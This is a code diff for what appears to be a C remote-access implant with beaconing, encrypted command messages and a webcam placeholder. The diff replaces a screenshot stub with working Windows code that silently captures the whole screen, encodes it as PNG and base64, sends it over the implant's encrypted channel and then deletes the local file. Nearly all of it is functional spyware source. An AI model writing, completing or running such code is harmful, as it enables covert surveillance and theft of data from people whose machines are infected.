@@ -345,6 +345,98 @@ char* decrypt_data(const char *encrypted, const char *shared_key) {
     return (char *)strdup((const char *)encrypted_data);
 }
 
+HRESULT SaveBitmapToPNG(HBITMAP hBitmap, const WCHAR* filename) {
+    HRESULT hr = CoInitialize(NULL);
+    if (FAILED(hr)) return hr;
+
+    IWICImagingFactory* pFactory = NULL;
+    IWICBitmap* pWICBitmap = NULL;
+    IWICBitmapEncoder* pEncoder = NULL;
+    IWICBitmapFrameEncode* pFrame = NULL;
+    IWICStream* pStream = NULL;
+    BITMAP bmp;
+    void* pPixels = NULL;
+
+    do {
+        hr = CoCreateInstance(&CLSID_WICImagingFactory, NULL, CLSCTX_INPROC_SERVER, &IID_IWICImagingFactory, (LPVOID*)&pFactory);
+        if (FAILED(hr)) break;
+
+        hr = pFactory->lpVtbl->CreateStream(pFactory, &pStream);
+        if (FAILED(hr)) break;
+
+        hr = pStream->lpVtbl->InitializeFromFilename(pStream, filename, GENERIC_WRITE);
+        if (FAILED(hr)) break;
+
+        GetObject(hBitmap, sizeof(BITMAP), &bmp);
+        BITMAPINFO bmpInfo = { 0 };
+        bmpInfo.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
+        bmpInfo.bmiHeader.biWidth = bmp.bmWidth;
+        bmpInfo.bmiHeader.biHeight = bmp.bmHeight;
+        bmpInfo.bmiHeader.biPlanes = 1;
+        bmpInfo.bmiHeader.biBitCount = 32;
+        bmpInfo.bmiHeader.biCompression = BI_RGB;
+
+        HDC hdcScreen = GetDC(NULL);
+        HDC hdcMem = CreateCompatibleDC(hdcScreen);
+        HBITMAP hOldBitmap = (HBITMAP)SelectObject(hdcMem, hBitmap);
+
+        pPixels = malloc(bmp.bmWidth * bmp.bmHeight * 4);
+        if (!pPixels) {
+            hr = E_OUTOFMEMORY;
+            break;
+        }
+
+        if (!GetDIBits(hdcMem, hBitmap, 0, bmp.bmHeight, pPixels, &bmpInfo, DIB_RGB_COLORS)) {
+            hr = E_FAIL;
+            break;
+        }
+
+        SelectObject(hdcMem, hOldBitmap);
+        DeleteDC(hdcMem);
+        ReleaseDC(NULL, hdcScreen);
+
+        const WICPixelFormatGUID pixelFormat = GUID_WICPixelFormat32bppBGRA;
+        hr = pFactory->lpVtbl->CreateBitmapFromMemory(pFactory, bmp.bmWidth, bmp.bmHeight, &pixelFormat, bmp.bmWidth * 4, bmp.bmWidth * bmp.bmHeight * 4, (BYTE*)pPixels, &pWICBitmap);
+        if (FAILED(hr)) break;
+
+        hr = pFactory->lpVtbl->CreateEncoder(pFactory, &GUID_ContainerFormatPng, NULL, &pEncoder);
+        if (FAILED(hr)) break;
+
+        hr = pEncoder->lpVtbl->Initialize(pEncoder, (IStream*)pStream, WICBitmapEncoderNoCache);
+        if (FAILED(hr)) break;
+
+        hr = pEncoder->lpVtbl->CreateNewFrame(pEncoder, &pFrame, NULL);
+        if (FAILED(hr)) break;
+
+        hr = pFrame->lpVtbl->Initialize(pFrame, NULL);
+        if (FAILED(hr)) break;
+
+        hr = pFrame->lpVtbl->SetSize(pFrame, bmp.bmWidth, bmp.bmHeight);
+        if (FAILED(hr)) break;
+
+        hr = pFrame->lpVtbl->SetPixelFormat(pFrame, &pixelFormat);
+        if (FAILED(hr)) break;
+
+        hr = pFrame->lpVtbl->WriteSource(pFrame, (IWICBitmapSource*)pWICBitmap, NULL);
+        if (FAILED(hr)) break;
+
+        hr = pFrame->lpVtbl->Commit(pFrame);
+        if (FAILED(hr)) break;
+
+        hr = pEncoder->lpVtbl->Commit(pEncoder);
+    } while (0);
+
+    if (pPixels) free(pPixels);
+    if (pFrame) pFrame->lpVtbl->Release(pFrame);
+    if (pEncoder) pEncoder->lpVtbl->Release(pEncoder);
+    if (pWICBitmap) pWICBitmap->lpVtbl->Release(pWICBitmap);
+    if (pStream) pStream->lpVtbl->Release(pStream);
+    if (pFactory) pFactory->lpVtbl->Release(pFactory);
+    CoUninitialize();
+
+    return hr;
+}
+
 void send_command(const char* response) {
     char* encrypted = encrypt_data(response, SESSION_ID);
     if (encrypted == NULL) {
@@ -472,8 +564,58 @@ void start_beacon_interval() {
 
 // Function to handle screenshot (placeholder)
 void run_screenshot() {
-    // This would require platform-specific libraries
-    send_command("{\"response\": {\"error\": \"Screenshot functionality not implemented\"}}");
+    HDC hdcScreen = GetDC(NULL);
+    HDC hdcMem = CreateCompatibleDC(hdcScreen);
+    int screenWidth = GetSystemMetrics(SM_CXSCREEN);
+    int screenHeight = GetSystemMetrics(SM_CYSCREEN);
+    HBITMAP hBitmap = CreateCompatibleBitmap(hdcScreen, screenWidth, screenHeight);
+
+    if (!hdcMem || !hBitmap || !BitBlt(hdcMem, 0, 0, screenWidth, screenHeight, hdcScreen, 0, 0, SRCCOPY)) {
+        log_it("Failed to capture screenshot\n");
+        if (hBitmap) DeleteObject(hBitmap);
+        if (hdcMem) DeleteDC(hdcMem);
+        ReleaseDC(NULL, hdcScreen);
+        return;
+    }
+
+    const WCHAR* filename = L"screenshot.png";
+    HRESULT hr = SaveBitmapToPNG(hBitmap, filename);
+    
+    DeleteObject(hBitmap);
+    DeleteDC(hdcMem);
+    ReleaseDC(NULL, hdcScreen);
+
+    if (SUCCEEDED(hr)) {
+        // Read the file and encode it
+        FILE* file = _wfopen(filename, L"rb");
+        if (file) {
+            fseek(file, 0, SEEK_END);
+            long file_size = ftell(file);
+            fseek(file, 0, SEEK_SET);
+
+            unsigned char* file_data = malloc(file_size);
+            if (file_data) {
+                fread(file_data, 1, file_size, file);
+                char* base64_data = base64_encode(file_data, file_size);
+                if (base64_data) {
+                    // Prepare and send the command
+                    char* command = malloc(strlen(base64_data) + 100);
+                    if (command) {
+                        sprintf(command, "{\"response\": {\"name\": \"screenshot.png\", \"data\": \"%s\"}}", base64_data);
+                        send_command(command);
+                        free(command);
+                    }
+                    free(base64_data);
+                }
+                free(file_data);
+            }
+            fclose(file);
+        }
+        // Optionally, delete the file after sending
+        _wremove(filename);
+    } else {
+        log_it("Failed to save screenshot");
+    }
 }
 
 // Function to handle webcam (placeholder)
